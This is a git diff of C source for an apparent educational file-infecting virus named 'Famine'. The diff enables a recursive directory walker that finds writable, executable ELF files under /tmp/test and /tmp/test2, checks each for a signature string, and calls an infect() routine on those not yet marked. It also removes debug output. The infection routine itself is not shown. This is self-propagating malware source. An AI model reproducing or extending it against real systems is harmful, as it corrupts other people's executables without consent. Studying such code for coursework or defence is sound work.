@@ -24,21 +24,19 @@ bool    check_elf(FILE *fp, int arch)
 
 void analyze_directory(const char *dirname)
 {
-    //const char *string = "Famine version 1.0 (c)oded by fvieira-login2";
+    const char *string = "Famine version 1.0 (c)oded by fvieira-login2";
     DIR *dir = opendir(dirname);
     if (!dir)
         return;
-    if (strstr(dirname,"/tmp/test2/.git/objects/9c"))
-        printf("entrei no erro\n");
     struct dirent *entry;
     char path[1024];
-    //size_t len = strlen(string) + 1;
+    size_t len = strlen(string) + 1;
+    
     while ((entry = readdir(dir)) != NULL)
     {  
         // Skip . and ..
         if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
             continue;
-        
         snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);
         struct stat st;
         if (stat(path, &st) == -1)
@@ -48,34 +46,33 @@ void analyze_directory(const char *dirname)
         }
         if (S_ISDIR(st.st_mode))
         {
-            printf("[DIR ] %s\n", path);
+            //printf("[DIR ] %s\n", path);
             analyze_directory(path);
         }
         else if (S_ISREG(st.st_mode))
         {
-            FILE *fp = fopen(path, "ab+");
-            if (strstr(dirname,"/tmp/test2/.git/objects/9c"))
-                printf("entrei no erro loop\n");
-            check_elf(fp, 2);
-            if (strstr(dirname,"/tmp/test2/.git/objects/9c"))
-                printf("entrei no erro loop\n");
-            /*if (check_elf(fp, 2))
+            
+            if (access(path, W_OK) == 0  && access(path, X_OK) == 0)
             {
-                printf("Its elf: %s\n", path);
-                //check_infection(fp, string, len - 1);
-                if (!check_infection(fp, string, len - 1))
-                    infect(fp, string, len);
+                FILE *fp = fopen(path, "ab+");
+                if (check_elf(fp, 2))
+                {
+                    //printf("Its elf: %s\n", path);
+                    //check_infection(fp, string, len - 1);
+                    if (!check_infection(fp, string, len - 1))
+                        infect(fp, string, len);
+                    else
+                        printf("Already infected.\n");
+                }
                 else
-                    printf("Already infected.\n");
+                {
+                    //printf("[FILE] %s\n", path);
+                }
             }
-            else
-            {
-                printf("[FILE] %s\n", path);
-            }*/
         }
         else
         {
-            printf("[OTHR] %s\n", path);
+            //printf("[OTHR] %s\n", path);
         }
     }
     closedir(dir);
@@ -83,6 +80,6 @@ void analyze_directory(const char *dirname)
 
 void run_infection()
 {
-    //analyze_directory("/tmp/test");
+    analyze_directory("/tmp/test");
     analyze_directory("/tmp/test2");
 }
